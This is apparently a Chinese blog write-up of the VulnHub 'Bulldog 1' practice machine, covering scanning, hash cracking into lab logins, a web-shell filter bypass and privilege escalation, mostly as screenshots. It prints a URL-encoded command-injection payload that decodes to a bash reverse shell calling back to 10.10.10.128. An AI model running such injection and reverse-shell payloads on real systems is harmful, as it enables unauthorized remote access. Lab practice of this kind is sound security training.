+++
ShowToc = true
TocOpen = true
title = '0x020 Bulldog 1 '
date = 2024-10-11T14:25:59+08:00
draft = false
private = true
show_reading_time = true
categories = 'vulnhub'
+++



开机改网卡

# 端口扫描

![](/vulnhub_img/WEBRESOURCEb1af1bfc04642d04a8b1255a7ea5659c截图.png)

![](/vulnhub_img/WEBRESOURCE75ec00e2e54007ea720d139649796fcb截图.png)

# WEB渗透

8080和80端口一样的

![](/vulnhub_img/WEBRESOURCEd72212dbd9082666b98fc4bcb6e0b4b7截图.png)

发现隐藏信息，疑似账号密码：

![](/vulnhub_img/WEBRESOURCE8ad0d9336fe075a36686c5a354658e3a截图.png)

hashcat跑半天，破解hash还是建议使用在线的：

![](/vulnhub_img/WEBRESOURCE562c0da80a75385e3bbb3d23bed601b8截图.png)

破解出的密码如下：

[nick@bulldogindustries.com](http://nick@bulldogindustries.com)

bulldog

sarah@bulldogindustries.com

bulldoglover

登录后，成功进去webhell

![](/vulnhub_img/WEBRESOURCEe7be29680457b2caa0f774bf4c6e33eb截图.png)

阻止危险shell，那我想的就是绕过了：

![](/vulnhub_img/WEBRESOURCEfe337efad31bbc4536cbdf3a0992fd37截图.png)

记得url编码：

ls|%62%61%73%68%20%2d%63%20%27%2f%62%69%6e%2f%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%30%2e%31%32%38%2f%38%38%38%38%20%30%3e%26%31%27

![](/vulnhub_img/WEBRESOURCE35e0246221e6ebaeff9170af631b425b截图.png)

# 提权

![](/vulnhub_img/WEBRESOURCE43f2f829706792a67ebeda8cd680cfef截图.png)

没什么好说的，前面靶场遇到过的：

![](/vulnhub_img/WEBRESOURCE158237df7ed2eb7c97cfdc7558d8355f截图.png)